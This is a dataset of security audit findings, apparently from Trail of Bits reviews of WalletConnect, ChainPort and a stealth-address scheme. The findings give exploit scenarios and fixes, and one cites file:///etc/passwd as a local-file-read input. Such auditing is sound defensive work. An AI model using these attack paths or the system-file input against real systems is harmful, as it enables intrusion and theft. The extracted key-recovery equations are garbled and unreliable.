7748: * * > Protocol designers using Diffie-Hellman over the curves defined in * > this document must not assume \"contributory behavior\". Specially, * > contributory behavior means that both parties' private keys * > contribute to the resulting shared key. Since curve25519 and * > curve448 have cofactors of 8 and 4 (respectively), an input point of * > small order will eliminate any contribution from the other party's * > private key. This situation can be detected by checking for the all- * > zero output, which implementations MAY do, as specified in Section 6. * > However, a large number of existing implementations do not do this. * * IMPORTANT: the returned key is a raw result of scalar multiplication. * To use it as a key material, hash it with a cryptographic hash function. */ Figure 3.2: Warnings in x25519.sharedKey ( stablelib/packages/x25519/x25519.ts#595615 ) This nding is of informational severity because a compromised counterparty would already allow an attacker to observe or tamper with the communication. Exploit Scenario An attacker compromises the web server on which a dApp is hosted and introduces malicious code in the front end that makes it always provide a low-order point during the key exchange. When a user connects to this dApp with their WalletConnect-enabled wallet, the derived key is all zeros. The attacker passively captures and reads the exchanged messages. Recommendations Short term, enable the rejectZero ag for uses of the deriveSymKey function. Long term, when using cryptographic primitives, research any edge cases they may have and always review relevant implementation notes. Follow recommended practices and include any defense-in-depth safety checks to ensure the protocol operates as intended.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Insecure storage of session data in local storage ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-walletconnectv2-securityreview.pdf", "body": "HTML5 local storage is used to hold session data, including keychain values. Because there are no access controls on modifying and retrieving this data using JavaScript, data in local storage is vulnerable to XSS attacks. Figure 4.1: Keychain data stored in a browsers localStorage Exploit Scenario Alice discovers an XSS vulnerability in a dApp that supports WalletConnect. This vulnerability allows Alice to retrieve the dApps keychain data, allowing her to propose new transactions to the connected wallet. Recommendations Short term, consider using cookies to store and send tokens. Enable cross-site request forgery (CSRF) libraries available to mitigate these attacks. Ensure that cookies are tagged with httpOnly , and preferably secure , to ensure that JavaScript cannot access them. References  OWASP HTML5 Security Cheat Sheet: Local Storage A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "1. Several secrets checked into source control ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "The chainport-backend repository contains several secrets that are checked into source control. Secrets that are stored in source control are accessible to anyone who has had access to the repository (e.g., former employees or attackers who have managed to gain access to the repository). We used TrueHog to identify these secrets (by running the command trufflehog git file://. in the root directory of the repository). TrueHog found several types of credentials, including the following, which were veried through TrueHogs credential verication checks:  GitHub personal access tokens  Slack access tokens TrueHog also found unveried GitLab authentication tokens and Polygon API credentials. Furthermore, we found hard-coded credentials, such as database credentials, in the source code, as shown in gure 1.1. [REDACTED] Figure 1.1: chainport-backend/env.prod.json#L3-L4 Exploit Scenario An attacker obtains a copy of the source code from a former DcentraLab employee. The attacker extracts the secrets from it and uses them to exploit DcentraLabs database and insert events in the database that did not occur. Consequently, ChainPorts AWS lambdas process the fake events and allow the attacker to steal funds. Recommendations Short term, remove credentials from source control and rotate them. Run TrueHog by invoking the trufflehog git file://. command; if it identies any unveried credentials, check whether they need to be addressed. Long term, consider using a secret management solution such as Vault to store secrets. 2. Same credentials used for staging, test, and production environment databases Severity: Low Diculty: High Type: Conguration Finding ID: TOB-CHPT-2 Target: Database authentication", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "3. Use of error-prone pattern for logging functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "The pattern shown in gure 3.1 is used repeatedly throughout the codebase to log function names. [REDACTED] Figure 3.1: An example of the pattern used by ChainPort to log function names This pattern is prone to copy-and-paste errors. Developers may copy the code from one function to another but forget to change the function name, as exemplied in gure 3.2. [REDACTED] Figure 3.2: An example of an incorrect use of the pattern used by ChainPort to log function names We wrote a Semgrep rule to detect these problems (appendix D). This rule detected 46 errors associated with this pattern in the back-end application. Figure 3.3 shows an example of one of these ndings. [REDACTED] Figure 3.3: An example of one of the 46 errors resulting from the function-name logging pattern (chainport-backend/modules/web_3/helpers.py#L313-L315) Exploit Scenario A ChainPort developer is auditing the back-end application logs to determine the root cause of a bug. Because an incorrect function name was logged, the developer cannot correctly trace the applications ow and determine the root cause in a timely manner. Recommendations Short term, use the Python decorator in gure 3.4 to log function names. This will eliminate the risk of copy-and-paste errors. [REDACTED] Figure 3.4: A Python decorator that logs function names, eliminating the risk of copy-and-paste errors Long term, review the codebase for other error-prone patterns. If such patterns are found, rewrite the code in a way that eliminates or reduces the risk of errors, and write a Semgrep rule to nd the errors before the code hits production.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "4. Use of hard-coded strings instead of constants ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "The back-end code uses several hard-coded strings that could be dened as constants to prevent any typos from introducing vulnerabilities. For example, the checks that determine the systems environment compare the result of the get_env function with the strings develop, staging, prod, or local. Figure 4.1 shows an example of one of these checks. [REDACTED] Figure 4.1: chainport-backend/project/lambdas/mainchain/rebalance_monitor.py#L42-L43 We did not nd any typos in these literal strings, so we set the severity of this nding to informational. However, the use of hard-coded strings in place of constants is not best practice; we suggest xing this issue and following other best practices for writing safe code to prevent the introduction of bugs in the future. Exploit Scenario A ChainPort developer creates code that should run only in the development build and safeguards it with the check in gure 4.2. [REDACTED] Figure 4.2: An example of a check against a hard-coded string that could lead to a vulnerability This test always failsthe correct value to test should have been develop. Now, the poorly tested, experimental code that was meant to run only in development mode is deployed in production. Recommendations Short term, create a constant for each of the four possible environments. Then, to check the systems environment, import the corresponding constant and use it in the comparison instead of the hard-coded string. Alternatively, use an enum instead of a string to perform these comparisons. Long term, review the code for other instances of hard-coded strings where constants could be used instead. Create Semgrep rules to ensure that developers never use hard-coded strings where constants are available.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "5. Use of incorrect operator in SQLAlchemy lter ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "The back-end code uses the is not operator in an SQLAlchemy querys filter. SQLAlchemy relies on the __eq__ family of methods to apply the lter; however, the is and is not operators do not trigger these methods. Therefore, only the comparison operators (== or !=) should be used. [REDACTED] Figure 5.1: chainport-backend/project/data/db/port.py#L173 We did not review whether this aw could be used to bypass the systems business logic, so we set the severity of this issue to undetermined. Exploit Scenario An attacker exploits this awed check to bypass the systems business logic and steal user funds. Recommendations Short term, replace the is not operator with != in the filter indicated above. Long term, to continuously monitor the codebase for reintroductions of this issue, run the python.sqlalchemy.correctness.bad-operator-in-filter.bad-operator-in-f ilter Semgrep rule as part of the CI/CD ow. References  SQLAlchemy: Common Filter Operators  Stack Overow: Select NULL Values in SQLAlchemy", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "6. Several functions receive the wrong number of arguments ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "Several functions in the chainport-backend repository are called with an incorrect number of arguments:  Several functions in the /project/deprecated_files folder  A call to release_tokens_by_maintainer from the rebalance_bridge function (gures 6.1 and 6.2)  A call to generate_redeem_signature from the regenerate_signature function (gures 6.3 and 6.4)  A call to get_next_nonce_for_public_address from the prepare_erc20_transfer_transaction function (gures 6.5 and 6.6)  A call to get_cg_token_address_list from the main function of the le (likely old debugging code) [REDACTED] Figure 6.1: The release_tokens_by_maintainer function is called with four arguments, but at least ve are required. (chainport-backend/project/lambdas/mainchain/rebalance_monitor.py#L109-L1 14) [REDACTED] Figure 6.2: The denition of the release_tokens_by_maintainer function (chainport-backend/project/lambdas/release_tokens_by_maintainer.py#L27-L3 4) [REDACTED] Figure 6.3: A call to generate_redeem_signature that is missing the network_id argument (chainport-backend/project/scripts/keys_maintainers_signature/regenerate_ signature.py#L38-L43) [REDACTED] Figure 6.4: The denition of the generate_redeem_signature function (chainport-backend/project/lambdas/sidechain/events_handlers/handle_burn_ event.py#L46-L48) [REDACTED] Figure 6.5: A call to get_next_nonce_for_public_address that is missing the outer_session argument (chainport-backend/project/web3_cp/erc20/prepare_erc20_transfer_transacti on.py#L32-L34) [REDACTED] Figure 6.6: The denition of the get_next_nonce_for_public_address function (chainport-backend/project/web3_cp/nonce.py#L19-L21) [REDACTED] Figure 6.7: A call to get_cg_token_address_list that is missing all three arguments (chainport-backend/project/lambdas/token_endpoints/cg_list_get.py#L90-91) [REDACTED] Figure 6.8: The denition of the get_cg_token_address_list function (chainport-backend/project/lambdas/token_endpoints/cg_list_get.py#L37) We did not review whether this aw could be used to bypass the systems business logic, so we set the severity of this issue to undetermined. Exploit Scenario The release_tokens_by_maintainer function is called from the rebalance_bridge function with the incorrect number of arguments. As a result, the rebalance_bridge function fails if the token balance is over the threshold limit, and the tokens are not moved to a safe address. An attacker nds another aw and is able to steal more tokens than he would have been able to if the tokens were safely stored in another account. Recommendations Short term, x the errors presented in the description of this nding by adding the missing arguments to the function calls. Long term, run pylint or a similar static analysis tool to detect these problems (and others) before the code is committed and deployed in production. This will ensure that if the list of a functions arguments ever changes (which was likely the root cause of this problem), a call that does not match the new arguments will be agged before the code is deployed.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "7. Lack of events for critical operations ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "Several critical operations do not trigger events. As a result, it will be dicult to review the correct behavior of the contracts once they have been deployed. For example, the setSignatoryAddress function, which is called in the Validator contract to set the signatory address, does not emit an event providing conrmation of that operation to the contracts caller (gure 7.1). [REDACTED] Figure 7.1: The setSignatoryAddress function in Validator:43-52 Without events, users and blockchain-monitoring systems cannot easily detect suspicious behavior. Exploit Scenario Eve, an attacker, is able to compromise a quorum of the ChainPort congress voters contract. She then sets a new signatory address. Alice, a ChainPort team member, is unaware of the change and does not raise a security incident. Recommendations Short term, add events for all critical operations that result in state changes. Events aid in contract monitoring and the detection of suspicious behavior. Long term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. The system relies on several contracts to behave as expected. A monitoring mechanism for critical events would quickly detect any compromised system components.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "8. Lack of zero address checks in setter functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "Certain setter functions fail to validate incoming arguments, so callers can accidentally set important state variables to the zero address. For example, in the initialize function of the ChainportMainBridge contract, developers can dene the maintainer registry, the congress address for governance, and the signature validator and set their addresses to the zero address. [REDACTED] Figure 8.1: The initialize function of ChainportMainBridge.sol Failure to immediately reset an address that has been set to the zero address could result in unexpected behavior. Exploit Scenario Alice accidentally sets the ChainPort congress address to the zero address when initializing a new version of the ChainportMainBridge contract. The misconguration causes the system to behave unexpectedly, and the system must be redeployed once the misconguration is detected. Recommendations Short term, add zero-value checks to all constructor functions and for all setter arguments to ensure that users cannot accidentally set incorrect values, misconguring the system. Document any arguments that are intended to be set to the zero address, highlighting the expected values of those arguments on each chain. Long term, use the Slither static analyzer to catch common issues such as this one. Consider integrating a Slither scan into the projects CI pipeline, pre-commit hooks, or build scripts.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "9. Python type annotations are missing from most functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "The back-end code uses Python type annotations; however, their use is sporadic, and most functions are missing them. Exploit Scenario The cg_rest_call function receives the exception argument without specifying its type with a Python type annotation. The get_token_details_by_cg_id function calls cg_rest_call with an object of the incorrect type, an Exception instance instead of an Exception class, causing the program to crash (gure 9.1). [REDACTED] Figure 9.1: chainport-backend/modules/coingecko/api.py#L41-L42 Recommendations Short term, add type annotations to the arguments of every function. This will not prevent the code from crashing or causing undened behavior during runtime; however, it will allow developers to clearly see each arguments expected type and static analyzers to better detect type mismatches. Long term, implement checks in the CI/CD pipeline to ensure that code without type annotations is not accepted.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "10. Use of libraries with known vulnerabilities ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "The back-end repository uses outdated libraries with known vulnerabilities. We used pip-audit, a tool developed by with support from Google to audit Python environments and dependency trees for known vulnerabilities, and identied two known vulnerabilities in the projects dependencies (as shown in gure 10.1). [REDACTED] Figure 10.1: A list of outdated libraries in the back-end repository Recommendations Short term, update the projects dependencies to their latest versions wherever possible. Use pip-audit to conrm that no vulnerable dependencies remain. Long term, add pip-audit to the projects CI/CD pipeline. Do not allow builds to succeed with dependencies that have known vulnerabilities.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "11. Use of JavaScript instead of TypeScript ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "The ChainPort front end is developed with JavaScript instead of TypeScript. TypeScript is a strongly typed language that compiles to JavaScript. It allows developers to specify the types of variables and function arguments, and TypeScript code will fail to compile if there are type mismatches. Contrarily, JavaScript code will crash (or worse) during runtime if there are type mismatches. In summary, TypeScript is preferred over JavaScript for the following reasons:  It improves code readability; developers can easily identify variable types and the types that functions receive.  It improves security by providing static type checking that catches errors during compilation.  It improves support for integrated development environments (IDEs) and other tools by allowing them to reason about the types of variables. Exploit Scenario A bug in the front-end application is missed, and the code is deployed in production. The bug causes the application to crash, preventing users from using it. This bug would have been caught if the front-end application were written in TypeScript. Recommendations Short term, rewrite newer parts of the application in TypeScript. TypeScript can be used side-by-side with JavaScript in the same application, allowing it to be introduced gradually. Long term, gradually rewrite the whole application in TypeScript.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "12. Use of .format to create SQL queries ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "The back end builds SQL queries with the .format function. An attacker that controls one of the variables that the function is formatting will be able to inject SQL code to steal information or damage the database. [REDACTED] Figure 12.1: chainport-backend/project/data/db/postgres.py#L4-L24 [REDACTED] Figure 12.2: chainport-backend/project/lambdas/database_monitor/clear_lock.py#L29-L31 None of the elds described above are attacker-controlled, so we set the severity of this nding to informational. However, the use of .format to create SQL queries is an anti-pattern; parameterized queries should be used instead. Exploit Scenario A developer copies the vulnerable code to create a new SQL query. This query receives an attacker-controlled string. The attacker conducts a time-based SQL injection attack, leaking the whole database. Recommendations Short term, use parameterized queries instead of building strings with variables by hand. Long term, create or use a static analysis check that forbids this pattern. This will ensure that this pattern is never reintroduced by a less security-aware developer.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "13. Many rules are disabled in the ESLint conguration ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "There are 34 rules disabled in the front-end eslint conguration. Disabling some of these rules does not cause problems, but disabling others reduces the codes security and reliability (e.g., react/no-unescaped-entities, consistent-return, no-shadow) and the codes readability (e.g., react/jsx-boolean-value, react/jsx-one-expression-per-line). Furthermore, the code contains 46 inline eslint-disable comments to disable specic rules. While disabling some of these rules in this way may be valid, we recommend adding a comment to each instance explaining why the specic rule was disabled. Recommendations Short term, create a list of rules that can be safely disabled without reducing the codes security or readability, document the justication, and enable every other rule. Fix any ndings that these rules may report. For rules that are disabled with inline eslint-disable comments, include explanatory comments justifying why they are disabled.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "14. Congress can lose quorum after manually setting the quorum value ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "Proposals to the ChainPort congress must be approved by a minimum quorum of members before they can be executed. By default, when a new member is added to the congress, the quorum is updated to be N  1, where N is the number of congress members. [REDACTED] Figure 14.1: smart-contracts/contracts/governance/ChainportCongressMembersRegistry.so l#L98-L119 However, the congress has the ability to overwrite the quorum number to any nonzero number, including values larger than the current membership. [REDACTED] Figure 14.2: smart-contracts//contracts/governance/ChainportCongressMembersRegistry.s ol#L69-L77 If the congress manually lowers the quorum number and later adds a member, the quorum number will be reset to one less than the total membership. If for some reason certain members are temporarily or permanently unavailable (e.g., they are on vacation or their private keys were destroyed), the minimum quorum would not be reached. Exploit Scenario The ChainPort congress is composed of 10 members. Alice submits a proposal to reduce the minimum quorum to six members to ensure continuity while several members take vacations over a period of several months. During this period, a proposal to add Bob as a new member of the ChainPort congress is passed while Carol and Dave, two other congress members, are on vacation. This unexpectedly resets the minimum quorum to 10 members of the 11-person congress, preventing new proposals from being passed. Recommendations Short term, rewrite the code so that, when a new member is added to the congress, the minimum quorum number increases by one rather than being updated to the current number of congress members subtracted by one. Add a cap to the minimum quorum number to prevent it from being manually set to values larger than the current membership of the congress. Long term, uncouple operations for increasing and decreasing quorum values from operations for making congress membership changes. Instead, require that such operations be included as additional actions in proposals for membership changes.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "15. Potential race condition could allow users to bypass PORTX fee payments ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "ChainPort fees are paid either as a 0.3% fee deducted from the amount transferred or as a 0.2% fee in PORTX tokens that the user has deposited into the ChainportFeeManager contract. To determine whether a fee should be paid in the base token or in PORTX, the back end checks whether the user has a sucient PORTX balance in the ChainportFeeManager contract. [REDACTED] Figure 15.1: chainport-backend//project/lambdas/fees/fees.py#L219-249 However, the ChainportFeeManager contract does not enforce an unbonding period, a period of time before users can unstake their PORTX tokens. [REDACTED] Figure 15.2: smart-contracts/contracts/ChainportFeeManager.sol#L113-L125 Since pending fee payments are generated as part of deposit, transfer, and burn events but the actual processing is handled by a separate monitor, it could be possible for a user to withdraw her PORTX tokens on-chain after the deposit event has been processed and before the fee payment transaction is conrmed, allowing her to avoid paying a fee for the transfer. Exploit Scenario Alice uses ChainPort to bridge one million USDC from the Ethereum mainnet to Polygon. She has enough PORTX deposited in the ChainportFeeManager contract to cover the $2,000 fee. She watches for the pending fee payment transaction and front-runs it to remove her PORTX from the ChainportFeeManager contract. Her transfer succeeds, but she is not required to pay the fee. Recommendations Short term, add an unbonding period preventing users from unstaking PORTX before the period has passed. Long term, ensure that deposit, transfer, and redemption operations are executed atomically with their corresponding fee payments.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "16. Signature-related code lacks a proper specication and documentation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "ChainPort uses signatures to ensure that messages to mint and release tokens were generated by the back end. These signatures are not well documented, and the properties they attempt to provide are often unclear. For example, answers to the following questions are not obvious; we provide example answers that could be provided in the documentation of ChainPorts use of signatures:  Why does the signed message contain a networkId eld, and why does it have to be unique? If not, an operation to mint tokens on one chain could be replayed on another chain.  Why does the signed message contain an action eld? The action eld prevents replay attacks in networks that have both a main and side bridge. Without this eld, a signature for minting tokens could be used on a sidechain contract of the same network to release tokens.  Why are both the signature and nonce checked for uniqueness in the contracts? The signatures could be represented in more than one format, which means that storing them is not enough to ensure uniqueness. Recommendations Short term, create a specication describing what the signatures protect against, what properties they attempt to provide (e.g., integrity, non-repudiation), and how these properties are provided.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "17. Cryptographic primitives lack sanity checks and clear function names ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "Several cryptographic primitives are missing sanity checks on their inputs. Without such checks, problems could occur if the primitives are used incorrectly. The remove_0x function (gure 17.1) does not check that the input starts with 0x. A similar function in the eth-utils library has a more robust implementation, as it includes a check on its input (gure 17.2). [REDACTED] Figure 17.1: chainport-backend/modules/cryptography_2key/signatures.py#L10-L16 [REDACTED] Figure 17.2: ethereum/eth-utils/eth_utils/hexadecimal.py#L43-L46 The add_leading_0 function's name does not indicate that the value is padded to a length of 64 (gure 17.3). [REDACTED] Figure 17.3: chainport-backend/modules/cryptography_2key/signatures.py#L19-L25 The _build_withdraw_message function does not ensure that the beneficiary_address and token_address inputs have the expected length of 66 bytes and that they start with 0x (gure 17.4). [REDACTED] Figure 17.4: chainport-backend/modules/cryptography_2key/signatures.py#L28-62 We did not identify problems in the way these primitives are currently used in the code, so we set the severity of this nding to informational. However, if the primitives are used improperly in the future, cryptographic bugs that can have severe consequences could be introduced, which is why we highly recommend xing the issues described in this nding. Exploit Scenario A developer fails to understand the purpose of a function or receives an input from outside the system that has an unexpected format. Because the functions lack sanity checks, the code fails to do what the developer expected. This leads to a cryptographic vulnerability and the loss of funds. Recommendations Short term, add the missing checks and x the naming issues described above. Where possible, use well-reviewed libraries rather than implementing cryptographic primitives in-house. Long term, review all the cryptographic primitives used in the codebase to ensure that the functions purposes are clear and that functions perform sanity checks, preventing them from being used improperly. Where necessary, add comments to describe the functions purposes.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "18. Use of requests without the timeout argument ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "The Python requests library is used in the ChainPort back end without the timeout argument. By default, the requests library will wait until the connection is closed before fullling a request. Without the timeout argument, the program will hang indenitely. The following locations in the back-end code are missing the timeout argument:  chainport-backend/modules/coingecko/api.py#L29  chainport-backend/modules/requests_2key/requests.py#L14  chainport-backend/project/stats/cg_prices.py#L74  chainport-backend/project/stats/cg_prices.py#L95 The code in these locations makes requests to the following websites:  https://api.coingecko.com  https://ethgasstation.info  https://gasstation-mainnet.matic.network If any of these websites hang indenitely, so will the back-end code. Exploit Scenario One of the requested websites hangs indenitely. This causes the back end to hang, and token ports from other users cannot be processed. Recommendations Short term, add the timeout argument to each of the code locations indicated above. This will ensure that the code will not hang if the website being requested hangs. Long term, integrate Semgrep into the CI pipeline to ensure that uses of the requests library always have the timeout argument.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "19. Lack of noopener attribute on external links ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "In the ChainPort front-end application, there are links to external websites that have the target attribute set to _blank but lack the noopener attribute. Without this attribute, an attacker could perform a reverse tabnabbing attack. [REDACTED] Figure 19.1: chainport-app/src/modules/exchange/components/PortOutModal.jsx#L126 Exploit Scenario An attacker takes control of one of the external domains linked by the front end. The attacker prepares a malicious script on the domain that uses the window.opener variable to control the parent windows location. A user clicks on the link in the ChainPort front end. The malicious website is opened in a new window, and the original ChainPort front end is seamlessly replaced by a phishing website. The victim then returns to a page that appears to be the original ChainPort front end but is actually a web page controlled by the attacker. The attacker tricks the user into transferring his funds to the attacker. Recommendations Short term, add the missing rel=\"noopener noreferrer\" attribute to the anchor tags. References  OWASP: Reverse tabnabbing attacks", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "20. Use of urllib could allow users to leak local les ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "To upload images of new tokens to S3, the upload_media_from_url_to_s3 function uses the urllib library (gure 20.1), which supports the file:// scheme; therefore, if a malicious actor controls a dynamic value uploaded to S3, she could read arbitrary local les. [REDACTED] Figure 20.1: chainport-backend/modules/infrastructure/aws/s3.py#L25-29 The code in gure 20.2 replicates this issue. [REDACTED] Figure 20.2: Code to test urlopens support of the file:// scheme We set the severity of this nding to undetermined because it is unclear whether an attacker (e.g., a token owner) would have control over token images uploaded to S3 and whether the server holds les that an attacker would want to extract. Exploit Scenario A token owner makes the image of his token point to a local le (e.g., file:///etc/passwd). This local le is uploaded to the S3 bucket and is shown to an attacker attempting to port his own token into the ChainPort front end. The local le is leaked to the attacker. Recommendations Short term, use the requests library instead of urllib. The requests library does not support the file:// scheme.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "21. The front end is vulnerable to iFraming ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "The ChainPort front end does not prevent other websites from iFraming it. Figure 21.1 shows an example of how another website could iFrame the ChainPort front end. [REDACTED] Figure 21.1: An example of how another website could iFrame the ChainPort front end Exploit Scenario An attacker creates a website that iFrames ChainPorts front end. The attacker performs a clickjacking attack to trick users into submitting malicious transactions. Recommendations Short term, add the X-Frame-Options: DENY header on every server response. This will prevent other websites from iFraming the ChainPort front end.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "22. Lack of CSP header in the ChainPort front end ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf", "body": "The ChainPort front end lacks a Content Security Policy (CSP) header, leaving it vulnerable to cross-site scripting (XSS) attacks. A CSP header adds extra protection against XSS and data injection attacks by enabling developers to select the sources that the browser can execute or render code from. This safeguard requires the use of the CSP HTTP header and appropriate directives in every server response. Exploit Scenario An attacker nds an XSS vulnerability in the ChainPort front end and crafts a custom XSS payload. Because of the lack of a CSP header, the browser executes the attack, enabling the attacker to trick users into transferring their funds to him. Recommendations Short term, use a CSP header in the ChainPort front end and validate it with the CSP Evaluator. This will help mitigate the eects of XSS attacks. Long term, track the development of the CSP header and similar web browser features that help mitigate security risks. Ensure that new protections are adopted as quickly as possible. References  HTTP Content Security Policy (CSP)  Google CSP Evaluator  Google Web Security Fundamentals: Eval  Google Web Security Fundamentals: Inline code is considered harmful", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "1. Related-nonce attacks across keys allow root key recovery ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-ryanshea-practicalstealthaddresses-securityreview.pdf", "body": "Given multiple addresses generated by the same sender, if any two signatures with the associated private keys use the same nonce, then the recipients private root key can be recovered. Nonce reuse attacks are a known risk for single ECDSA keys, but this attack extends the vulnerability to all keys generated by a given sender. Exploit Scenario Alice uses Bobs public key to generate addresses  1 =  (  ||1 ) *  +   and  =  (  ||2 ) *  +  and deposits funds in each. Bobs corresponding private  2 keys will be   1 does not know  ||1 ) +  =  (    2   , she does know the dierence of the two: 2 =  (  ||2 ) +  and    1 or . Note that, while Alice   =  2   1 =  (  ||2 )   (  ||1 )  . As a result, she can write  2 =  1 +  .   Suppose Bob signs messages with hashes (respectively), and he uses the same nonce  2 and to transfer the funds out of   1 2  in both signatures. He will output signatures  1  1 and  1 ) (  ,  1 and ) (  ,  2 , where  = (  *  ) ,   1 =  (  1 ) +   1 , and =   2 (  2 +   1 +   )  .  Subtracting the -values gives us  1 except  are known, Alice can recover  1   2  =  (  1  , and thus 1   2  , and 2    )    . Because all the terms =  2   (  ||2 ) .  Recommendations Consider using deterministic nonce generation in any stealth-enabled wallets. This is an approach used in multiple elliptic curve digital signature schemes, and can be adapted to ECDSA relatively easily; see RFC 6979 . Also consider root key blinding. Set   =  (  ||  ) *  +  (  ||  ||\"  \" ) *    With blinding, private keys take the form   =  (  ||  ) +    (  ||  ||\"  \" )   Since the   terms no longer cancel out, Alice cannot nd , and the attack falls apart.    .  . Finally, consider using homogeneous key derivation. Set private key for Bob is then   =  (  ||  )   +       =  (  ||  ) *  +   . Because Alice does not know   . The  ,  she cannot nd  , and the attack falls apart.  References   ECDSA: Handle with Care RFC 6979: Deterministic Usage of the Digital Signature Algorithm (DSA) and Elliptic Curve Digital Signature Algorithm (ECDSA)", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Undetermined"]}, {"title": "2. Limited forgeries for related keys ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-ryanshea-practicalstealthaddresses-securityreview.pdf", "body": "If Bob signs a message for an address generated by Alice, Alice can convert it into a valid signature for another address. She cannot, however, control the hash of the message being signed, so this attack is of limited value. As with the related-nonce attack, this attack relies on Alice knowing the dierence in discrete logarithms between two addresses. Exploit Scenario Alice generates addresses  1 =  (  ||1 ) *  +   and  2  =  (  ||2 ) *  +    and deposits funds in each account. As before, Alice knows discrete logs for  1 and  , and 2   =  2   . 1   , the dierence of the Bob transfers money out of  , generating signature 2  *  -coordinate of (where  where  is the  (  ,  ) of a message   with hash , is the nonce). The signature is validated by computing  =    1 *  +    1 *  2 and verifying that the  -coordinate of   matches . Alice can convert this into a signature under for a message with hash  ' =  +   .  Verifying this signature under  , computing 1  1  becomes:  = (  +    1 )  *  +    1 *  1   1 =   *  +    1   1  *  +   1 *    1 =   *  +    1 (  1 +   ) *   1 =   *  +    1 *  2 This is the same relation that makes will be correct. (  ,  ) a valid signature on a message with hash , so   Note that Alice has no control over the value of  ' would have to nd a preimage preimages is, to date, a hard problem for SHA-256 and related functions. under the given hash function. Computing , so to make an eective exploit, she  ' of  ' Recommendations Consider root key blinding, as above. The attack relies on Alice knowing blinding prevents her from learning it.   , and root key Consider homogeneous key derivation, as above. Once again, depriving Alice of   obviates the attack completely.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "3. Mutual transactions can be completely deanonymized ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-ryanshea-practicalstealthaddresses-securityreview.pdf", "body": "When Alice and Bob both make stealth payments to each other, they generate the same Shared Secret #i for transaction i, which is used to derive destination keys for Bob and Alice: Symbol", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "4. Allowing invalid public keys may enable DH private key recovery ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-ryanshea-practicalstealthaddresses-securityreview.pdf", "body": "Consider the following three assumptions: 1. 2. 3. Alice can add points that are not on the elliptic curve to the public key database, Bob does not verify the public key points, and Bob's scalar multiplication implementation has some specic characteristics. Assumptions 1 and 2 are currently not specied in the specication, which motivates this nding. If these assumptions 